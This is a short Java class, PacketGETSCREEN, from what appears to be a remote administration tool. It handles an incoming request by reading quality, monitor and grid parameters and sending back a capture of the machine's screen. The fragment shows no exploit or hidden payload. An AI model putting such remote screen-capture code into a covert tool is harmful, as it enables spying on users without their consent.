package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.RemoteScreen;

public class PacketGETSCREEN extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		int quality = Connection.readInt();
		int monitor = Connection.readInt();
		int rows = Connection.readInt();
		int cols = Connection.readInt();
		RemoteScreen.send(false, quality, monitor, rows, cols);
	}

}
